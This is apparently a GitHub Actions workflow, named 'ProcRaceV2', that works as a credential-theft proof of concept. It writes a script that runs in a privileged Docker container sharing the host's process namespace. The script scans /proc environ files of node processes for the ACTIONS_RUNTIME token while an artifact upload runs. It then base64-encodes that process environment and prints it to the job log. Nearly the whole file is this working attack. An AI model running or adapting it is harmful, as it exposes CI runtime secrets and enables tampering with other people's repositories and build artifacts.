name: ProcRaceV2
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Write monitor script and start background
        run: |
          echo "probe" > /tmp/probe.txt
          cat > /tmp/docker-monitor.sh << 'MONEOF'
#!/bin/bash
for i in $(seq 1 300); do
  for envfile in /proc/[0-9]*/environ; do
    pid="${envfile%/environ}"
    pid="${pid#/proc/}"
    cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 200)
    if echo "$cmd" | grep -qi "node"; then
      envdata=$(cat "$envfile" 2>/dev/null | base64 -w0)
      if echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME; then
        echo "FOUND_PID=$pid ITER=$i"
        echo "CMD=$cmd"
        echo "ENV_B64_START"
        echo "$envdata"
        echo "ENV_B64_END"
        exit 0
      fi
    fi
  done
  sleep 0.1
done
echo "NOT_FOUND"
# Dump all node procs seen at end
for envfile in /proc/[0-9]*/environ; do
  pid="${envfile%/environ}"
  pid="${pid#/proc/}"
  cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 100)
  if echo "$cmd" | grep -qi "node"; then
    echo "SEEN_NODE PID=$pid CMD=${cmd:0:80}"
  fi
done
MONEOF
          chmod +x /tmp/docker-monitor.sh
          nohup docker run --rm --privileged --pid=host \
            -v /tmp/docker-monitor.sh:/monitor.sh:ro \
            ubuntu:24.04 bash /monitor.sh > /tmp/monitor.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          echo "Started monitor PID=$(cat /tmp/bgpid.txt)"
          sleep 3

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt

      - name: Read monitor results
        run: |
          sleep 2
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          echo "=MONITOR_LOG_START="
          cat /tmp/monitor.log
          echo "=MONITOR_LOG_END="
